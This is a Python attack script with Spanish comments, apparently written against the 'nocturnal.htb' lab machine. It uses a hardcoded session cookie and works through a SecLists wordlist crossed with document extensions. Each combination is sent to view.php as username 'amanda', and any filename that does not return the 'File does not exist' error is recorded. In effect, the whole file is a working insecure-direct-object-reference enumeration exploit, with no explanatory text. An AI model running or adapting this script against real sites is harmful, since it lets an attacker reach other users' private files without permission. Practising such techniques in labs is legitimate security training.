import requests

# Configuración
url = "http://nocturnal.htb/view.php"
username = "amanda"
extensions = ["pdf", "doc", "docx", "xls", "xlsx", "odt"]
error_indicator = "<div class='error'>File does not exist.</div>"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Referer": "http://nocturnal.htb/dashboard.php",
    "Cookie": "PHPSESSID=np3qqbhi546j6fs20kg99ascpd",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
}

# Leer nombres base desde archivo (sin extensión)
with open("/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt", "r") as f:
    filenames = [line.strip() for line in f if line.strip()]

total = len(filenames) * len(extensions)
i = 0

with open("amanda_files.txt", "a") as output_file:
    for name in filenames:
        for ext in extensions:
            i += 1
            full_file = f"{name}.{ext}"
            params = {
                "username": username,
                "file": full_file
            }

            try:
                print(f"{i}/{total} -> Probando {full_file}")
                response = requests.get(url, headers=headers, params=params)

                # Mostrar solo si NO contiene el error
                if error_indicator not in response.text:
                    print(f"[POTENCIAL] {full_file} parece válido (no se encontró el error)")
                    output_file.write(full_file + "\n")
            except requests.RequestException as e:
                print(f"[ERROR] {full_file}: {e}")
